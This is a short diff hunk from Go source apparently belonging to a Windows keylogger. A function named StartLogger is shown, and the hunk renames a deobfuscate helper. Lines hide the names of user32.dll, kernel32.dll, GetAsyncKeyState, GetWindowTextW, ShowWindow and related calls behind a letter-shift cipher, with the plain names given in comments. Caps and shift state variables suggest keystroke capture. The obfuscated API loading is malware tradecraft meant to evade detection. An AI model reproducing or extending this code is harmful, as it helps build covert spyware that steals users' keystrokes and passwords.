@@ -24,13 +24,13 @@ func StartLogger(mode int) {
 	}
 }
 
-var user32 = syscall.NewLazyDLL(deobfuscate("vtfs43/emm"))                       //user32.dll
-var kernel32 = syscall.NewLazyDLL(deobfuscate("lfsofm43/emm"))                   //kernel32.dll
-var procGetForegroundWindow = user32.NewProc(deobfuscate("HfuGpsfhspvoeXjoepx")) //GetForegroundWindow
-var procGetWindowTextW = user32.NewProc(deobfuscate("HfuXjoepxUfyuX"))           //GetWindowTextW
-var procShowWindow = user32.NewProc(deobfuscate("TipxXjoepx"))                   //ShowWindow
-var procEnumWindows = user32.NewProc(deobfuscate("FovnXjoepxt"))                 //EnumWindows
-var procGetAsyncKeyState = user32.NewProc(deobfuscate("HfuBtzodLfzTubuf"))       //GetAsyncKeyState
+var user32 = syscall.NewLazyDLL(Deobfuscate("vtfs43/emm"))                       //user32.dll
+var kernel32 = syscall.NewLazyDLL(Deobfuscate("lfsofm43/emm"))                   //kernel32.dll
+var procGetForegroundWindow = user32.NewProc(Deobfuscate("HfuGpsfhspvoeXjoepx")) //GetForegroundWindow
+var procGetWindowTextW = user32.NewProc(Deobfuscate("HfuXjoepxUfyuX"))           //GetWindowTextW
+var procShowWindow = user32.NewProc(Deobfuscate("TipxXjoepx"))                   //ShowWindow
+var procEnumWindows = user32.NewProc(Deobfuscate("FovnXjoepxt"))                 //EnumWindows
+var procGetAsyncKeyState = user32.NewProc(Deobfuscate("HfuBtzodLfzTubuf"))       //GetAsyncKeyState
 var caps bool
 var shift bool
 
